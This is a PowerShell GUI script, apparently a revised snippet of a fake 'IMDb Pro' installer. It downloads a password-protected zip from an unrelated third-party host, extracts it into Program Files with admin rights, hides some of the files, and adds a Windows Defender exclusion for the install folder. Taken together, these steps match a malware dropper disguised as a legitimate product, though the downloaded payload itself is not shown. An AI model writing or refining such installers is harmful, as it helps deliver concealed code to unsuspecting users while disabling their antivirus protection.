Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# [UI creation code remains unchanged, omitted for brevity, same as your provided code]

# --- Replace this function with enhanced version ---
function Download-FileWithProgress {
    param(
        [string]$Url,
        [string]$OutputPath
    )
    try {
        Write-Host "📥 Downloading from: $Url" -ForegroundColor Cyan
        Write-Host "📁 Saving to: $OutputPath" -ForegroundColor Cyan
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $OutputPath)
        if (Test-Path $OutputPath) {
            $fileInfo = Get-Item $OutputPath
            Write-Host "✅ Download successful! Size: $($fileInfo.Length) bytes" -ForegroundColor Green
            if ($fileInfo.Length -eq 0) {
                Write-Host "❌ Downloaded file is empty!" -ForegroundColor Red
                return $false
            }
            return $true
        } else {
            Write-Host "❌ Download failed - file not created" -ForegroundColor Red
            return $false
        }
    }
    catch {
        Write-Host "❌ Download error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# [All extraction, Hide-Files, and animation functions remain as in your code]

# --- Replace Start-Installation with this version ---
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $tempFile = "$env:TEMP\imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    try {
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "🧹 Cleaned up existing temp file" -ForegroundColor Yellow
        }
        Update-Status "Checking administrator privileges..." 10 "🔍" -Loading
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required" 0 "❌"
            [System.Windows.Forms.MessageBox]::Show(
                "Please run this installer as Administrator.", 
                "Elevation Required", 
                [System.Windows.Forms.MessageBoxButtons]::OK, 
                [System.Windows.Forms.MessageBoxIcon]::Warning
            )
            $installButton.Enabled = $true
            $installButton.Text = "🚀 START INSTALLATION"
            return
        }
        Update-Status "Creating installation directory..." 20 "📁" -AnimateProgress
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
            Write-Host "✅ Created installation directory: $installPath" -ForegroundColor Green
        }
        Update-Status "Downloading IMDb Pro package..." 40 "📥" -Loading
        $downloadSuccess = Download-FileWithProgress -Url $downloadUrl -OutputPath $tempFile
        # Improved: Check existence & size
        if (-not $downloadSuccess) {
            throw "Download failed - cannot continue without the package"
        }
        if (-not (Test-Path $tempFile)) {
            throw "Downloaded file not found at $tempFile"
        }
        $fileInfo = Get-Item $tempFile
        if ($fileInfo.Length -eq 0) {
            throw "Downloaded file is empty!"
        }
        Write-Host "📦 Downloaded ZIP size: $($fileInfo.Length) bytes" -ForegroundColor Cyan
        Update-Status "Download completed successfully!" 60 "✅" -AnimateProgress
        Update-Status "Starting extraction process..." 70 "🔐" -Loading
        $extractionSuccess = Extract-ZipWithPassword -ZipFile $tempFile -Destination $installPath -Password $zipPassword
        if (-not $extractionSuccess) {
            throw "All extraction methods failed. Please ensure 7-Zip is installed for password-protected ZIP files."
        }
        Update-Status "Extraction completed successfully!" 80 "✅" -AnimateProgress
        Update-Status "Securing installation files..." 85 "🔒" -Loading
        Hide-Files -FolderPath $installPath
        Update-Status "Finalizing installation..." 95 "🎯" -Loading
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "🧹 Cleaned up temporary file" -ForegroundColor Green
        }
        try {
            Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
            Write-Host "🛡️ Added Windows Defender exclusion" -ForegroundColor Green
        }
        catch {
            Write-Host "⚠️ Windows Defender exclusion failed: $($_.Exception.Message)" -ForegroundColor Yellow
        }
        for ($i = 96; $i -le 100; $i++) {
            Update-Status "Completing installation..." $i "✨"
            Start-Sleep -Milliseconds 60
        }
        Update-Status "Installation completed successfully!" 100 "✅"
        Start-CelebrationAnimation
        $installButton.Text = "✅ INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        $installButton.Enabled = $false
        $result = [System.Windows.Forms.MessageBox]::Show(
            "🎬 IMDb Pro has been successfully installed!`n`n" +
            "📍 Location: $installPath`n" +
            "📥 Downloaded from: $downloadUrl`n" +
            "🔐 Password used: $zipPassword`n" +
            "📁 Files extracted and secured`n" +
            "🔒 Specific files hidden for security`n`n" +
            "Would you like to open the installation folder now?",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::YesNo,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
            Invoke-Item $installPath
        }
    }
    catch {
        for ($i = 0; $i -lt 3; $i++) {
            Update-Status "Installation failed!" 0 "💥"
            Start-Sleep -Milliseconds 200
            Update-Status "Installation failed!" 0 "❌"
            Start-Sleep -Milliseconds 200
        }
        Update-Status "Error: $($_.Exception.Message)" 0 "🚫"
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "🧹 Cleaned up temporary file after error" -ForegroundColor Yellow
        }
        $installButton.Text = "🔄 TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)`n`n" +
            "Troubleshooting steps:`n" +
            "• Check internet connection`n" +
            "• Verify administrator privileges`n" +
            "• Install 7-Zip for password extraction`n" +
            "• Check if password '123' is correct`n" +
            "• Verify URL is accessible: $downloadUrl`n" +
            "• Ensure sufficient disk space`n`n" +
            "Then try again.",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Install button click event
$installButton.Add_Click({
    $installButton.Enabled = $false
    $installButton.Text = "⏳ INSTALLING..."
    $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 152, 0)
    Start-Installation
})

# Show the form
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
